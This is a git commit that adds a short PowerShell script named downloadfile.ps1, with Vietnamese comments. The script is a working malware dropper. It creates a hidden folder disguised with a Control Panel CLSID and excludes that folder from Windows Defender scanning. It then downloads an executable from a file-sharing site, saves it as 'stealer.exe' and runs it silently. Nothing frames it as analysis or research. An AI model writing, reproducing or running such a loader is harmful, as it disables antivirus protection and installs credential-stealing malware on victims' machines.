7041c685b7aab4605b722adec6f7ad310ec15505
43a1723 <hai1723notgay@gmail.com>
2025-04-01 17:57:02 +0700

    Create downloadfile.ps1

---
+++ s/downloadfile.ps1
@@ -0,0 +1,22 @@
+$rdir = "$env:SystemDrive\ProgramData\Loader"
+$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
+$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
+New-Item -ItemType Directory -Path $dir
+Add-MpPreference -ExclusionPath $dir
+attrib +h +s $dir
+$folderPath = $dir
+$filePath = "$folderPath\stealer.exe"
+$url = "https://anonsharing.com/file/7e713a235817c63a/sigma_999.exe"
+
+# Tạo thư mục nếu chưa tồn tại
+if (!(Test-Path $folderPath)) {
+    New-Item -ItemType Directory -Path $folderPath -Force
+}
+
+# Kiểm tra nếu file chưa tồn tại thì tải về
+if (!(Test-Path $filePath)) {
+    Invoke-WebRequest -Uri $url -OutFile $filePath
+}
+
+# Chạy file thực thi
+Start-Process -FilePath $filePath -NoNewWindow
